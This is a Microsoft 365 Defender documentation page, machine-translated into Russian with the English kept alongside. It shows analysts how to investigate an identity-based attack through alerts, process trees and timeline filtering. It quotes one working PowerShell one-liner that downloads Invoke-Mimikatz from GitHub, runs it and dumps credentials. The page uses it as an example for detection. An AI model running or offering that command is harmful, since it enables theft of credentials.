---
title: Пример атаки на основе удостоверений
description: Проанализив пример атаки на основе удостоверений.
keywords: инциденты, оповещения, расследование, корреляция, атака, компьютеры, устройства, пользователи, удостоверения, удостоверения, почтовый ящик, электронная почта, 365, Microsoft, m365, реагирование на инциденты, кибератака
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 05/10/2021
ms.locfileid: "52297192"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="6a184-104">Пример атаки на основе удостоверений</span><span class="sxs-lookup"><span data-stu-id="6a184-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="6a184-105">**Область применения:**</span><span class="sxs-lookup"><span data-stu-id="6a184-105">**Applies to:**</span></span>
- <span data-ttu-id="6a184-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="6a184-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="6a184-107">Microsoft Defender for Identity может помочь обнаружить вредоносные попытки компрометации удостоверений в организации.</span><span class="sxs-lookup"><span data-stu-id="6a184-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="6a184-108">Так как Defender for Identity интегрируется с Microsoft 365 Defender, аналитики по безопасности могут иметь видимость угроз, исходяющих из Defender for Identity, таких как предполагаемые попытки повышения привилегий Netlogon.</span><span class="sxs-lookup"><span data-stu-id="6a184-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="6a184-109">Анализ атаки в Microsoft Defender для удостоверений</span><span class="sxs-lookup"><span data-stu-id="6a184-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="6a184-110">Microsoft 365 Defender позволяет аналитикам фильтровать оповещения с помощью источника обнаружения на вкладке **Оповещения** на странице инцидентов.</span><span class="sxs-lookup"><span data-stu-id="6a184-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="6a184-111">В следующем примере источник обнаружения фильтруется в **Defender for Identity.**</span><span class="sxs-lookup"><span data-stu-id="6a184-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Пример фильтрации источника обнаружения для Defender для identity":::

<span data-ttu-id="6a184-113">Выбор оповещений о предполагаемой атаке **overpass-the-hash** отправляется на страницу в Microsoft Cloud App Security, которая отображает более подробные сведения.</span><span class="sxs-lookup"><span data-stu-id="6a184-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="6a184-114">Вы всегда можете узнать больше об оповещении или атаке, выбрав дополнительные инструкции по этому типу оповещения, чтобы прочитать описание атаки, а также рекомендации по исправлению.  [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)</span><span class="sxs-lookup"><span data-stu-id="6a184-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Пример оповещений о предполагаемой атаке overpass-the-hash"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="6a184-116">Исследование той же атаки в Microsoft Defender для конечной точки</span><span class="sxs-lookup"><span data-stu-id="6a184-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="6a184-117">Кроме того, аналитик может использовать Defender для конечной точки, чтобы узнать больше об активности на конечной точке.</span><span class="sxs-lookup"><span data-stu-id="6a184-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="6a184-118">Выберите инцидент из очереди инцидента, а затем выберите **вкладку Оповещения.** Отсюда они также могут идентифицировать источник обнаружения.</span><span class="sxs-lookup"><span data-stu-id="6a184-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="6a184-119">Источник обнаружения, помеченный как EDR, означает endpoint Detection and Response , который является Defender для конечной точки.</span><span class="sxs-lookup"><span data-stu-id="6a184-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="6a184-120">Отсюда аналитик выбирает оповещение, обнаруженную EDR.</span><span class="sxs-lookup"><span data-stu-id="6a184-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Пример обнаружения и ответа конечной точки в Defender для конечной точки"::: 

<span data-ttu-id="6a184-122">На странице оповещений отображаются различные сведения, такие как имя устройства, имя пользователя, состояние автоматического расследования и сведения об оповещении.</span><span class="sxs-lookup"><span data-stu-id="6a184-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="6a184-123">В этой истории оповещений повествуется визуальное представление дерева процесса.</span><span class="sxs-lookup"><span data-stu-id="6a184-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="6a184-124">Дерево процесса представляет собой иерархическое представление родительских и детских процессов, связанных с оповещением.</span><span class="sxs-lookup"><span data-stu-id="6a184-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Пример дерева обработки оповещений в Defender для конечной точки"::: 

<span data-ttu-id="6a184-126">Каждый процесс можно расширить, чтобы просмотреть дополнительные сведения.</span><span class="sxs-lookup"><span data-stu-id="6a184-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="6a184-127">Сведения, которые может видеть аналитик, это фактические команды, которые были введены в составе вредоносного скрипта, IP-адресов исходящие подключения и другие полезные сведения.</span><span class="sxs-lookup"><span data-stu-id="6a184-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Пример сведений о процессе в Defender для конечной точки":::
 
<span data-ttu-id="6a184-129">Выбрав график См. в **графике,** аналитик может еще больше сверлить, чтобы определить точное время компромисса.</span><span class="sxs-lookup"><span data-stu-id="6a184-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="6a184-130">Microsoft Defender для конечной точки может обнаруживать множество вредоносных файлов и скриптов.</span><span class="sxs-lookup"><span data-stu-id="6a184-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="6a184-131">Однако из-за множества законных применений для исходящие подключения, PowerShell и командной строки некоторые действия будут считаться доброкачественными, пока не создадут вредоносный файл или действие.</span><span class="sxs-lookup"><span data-stu-id="6a184-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="6a184-132">Поэтому использование временной шкалы помогает аналитикам ввести оповещение в контекст с окружающими действиями, чтобы определить исходный источник или время атаки, которые в противном случае не заслонятся общей файловой системой и действиями пользователей.</span><span class="sxs-lookup"><span data-stu-id="6a184-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="6a184-133">Для этого аналитик начнет во время обнаружения оповещений (красным цветом) и вовремя прокрутит вниз назад, чтобы определить, когда первоначальное действие, которое привело к вредоносной активности, на самом деле началось.</span><span class="sxs-lookup"><span data-stu-id="6a184-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Пример запуска во время обнаружения оповещений"::: 

<span data-ttu-id="6a184-135">Важно понимать и различать общие действия, такие как подключения Windows Update, Windows доверенный трафик активации программного обеспечения, другие распространенные подключения к сайтам Майкрософт, сторонние действия в Интернете, Microsoft Endpoint Configuration Manager активности и другие доброкачественные действия от подозрительной активности.</span><span class="sxs-lookup"><span data-stu-id="6a184-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="6a184-136">Один из способов добиться этого — использовать фильтры временной шкалы.</span><span class="sxs-lookup"><span data-stu-id="6a184-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="6a184-137">Существует множество фильтров, которые могут выделить определенные действия, отфильтровывая все, что аналитик не хочет просматривать.</span><span class="sxs-lookup"><span data-stu-id="6a184-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="6a184-138">На рисунке ниже аналитик фильтруется для просмотра только сетевых событий и процессов.</span><span class="sxs-lookup"><span data-stu-id="6a184-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="6a184-139">Это позволяет аналитику видеть сетевые подключения и процессы, связанные с событием, Блокнот установлено подключение с IP-адресом, которое мы также видели в дереве процесса.</span><span class="sxs-lookup"><span data-stu-id="6a184-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Пример использования Блокнот для подключения к вредоносным исходящие"::: 

<span data-ttu-id="6a184-141">В этом конкретном событии Блокнот для подключения к вредоносным исходящие.</span><span class="sxs-lookup"><span data-stu-id="6a184-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="6a184-142">Однако часто злоумышленники просто iexplorer.exe для создания подключений для загрузки вредоносной полезной нагрузки, так как обычно iexplorer.exe обычно считаются обычными действиями веб-браузера.</span><span class="sxs-lookup"><span data-stu-id="6a184-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="6a184-143">Другим элементом, который следует искать в временной шкале, является использование PowerShell для исходящие подключения.</span><span class="sxs-lookup"><span data-stu-id="6a184-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="6a184-144">Аналитик будет искать успешные подключения PowerShell с командами, такими как исходящие подключения к веб-сайту, на который размещен `IEX (New-Object Net.Webclient)` вредоносный файл.</span><span class="sxs-lookup"><span data-stu-id="6a184-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="6a184-145">В следующем примере PowerShell использовалась для скачивания и выполнения Mimikatz с веб-сайта:</span><span class="sxs-lookup"><span data-stu-id="6a184-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="6a184-146">Аналитик может быстро искать ключевые слова, введя ключевое слово в панели поиска, чтобы отображать только события, созданные с помощью PowerShell.</span><span class="sxs-lookup"><span data-stu-id="6a184-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="6a184-147">Следующий шаг</span><span class="sxs-lookup"><span data-stu-id="6a184-147">Next step</span></span>

<span data-ttu-id="6a184-148">См. [путь к расследованию фишинга.](first-incident-path-phishing.md)</span><span class="sxs-lookup"><span data-stu-id="6a184-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="6a184-149">См. также</span><span class="sxs-lookup"><span data-stu-id="6a184-149">See also</span></span>

- [<span data-ttu-id="6a184-150">Обзор инцидентов</span><span class="sxs-lookup"><span data-stu-id="6a184-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="6a184-151">Управление инцидентами</span><span class="sxs-lookup"><span data-stu-id="6a184-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="6a184-152">Исследование инцидентов</span><span class="sxs-lookup"><span data-stu-id="6a184-152">Investigate incidents</span></span>](investigate-incidents.md)
